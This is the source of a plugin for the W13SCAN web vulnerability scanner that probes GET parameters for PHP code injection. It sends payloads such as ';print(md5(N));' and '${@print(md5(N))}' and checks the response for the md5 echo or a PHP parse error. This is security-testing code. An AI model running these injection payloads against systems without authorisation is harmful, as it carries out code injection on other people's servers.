#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 11:49 AM
# @Author  : w8ay
# @File    : command_php_code.py
import copy
import os
import random
import re

import requests

from lib.common import prepare_url, md5
from lib.const import acceptedExt, ignoreParams
from lib.output import out
from lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'PHP代码注入'
    desc = '''暂只支持Get请求方式和回显型的PHP代码注入'''

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'GET':
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            regx = 'Parse error: syntax error,.*?\sin\s'
            randint = random.randint(1, 256)
            verify_result = md5(str(randint).encode())
            payloads = [
                "print(md5({}));",
                ";print(md5({}));",
                "';print(md5({}));$a='",
                "\";print(md5({}));$a=\"",
                "${{@print(md5({}))}}",
                "${{@print(md5({}))}}\\"
            ]

            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                data = copy.deepcopy(params)
                for payload in payloads:
                    if payload[0] == "p":
                        data[k] = payload.format(randint)
                    else:
                        data[k] = v + payload.format(randint)
                    url1 = prepare_url(netloc, params=data)
                    r = requests.get(url1, headers=headers)
                    html1 = r.text
                    if verify_result in html1:
                        out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
                        break
                    if re.search(regx, html1, re.I | re.S | re.M):
                        out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
                        break
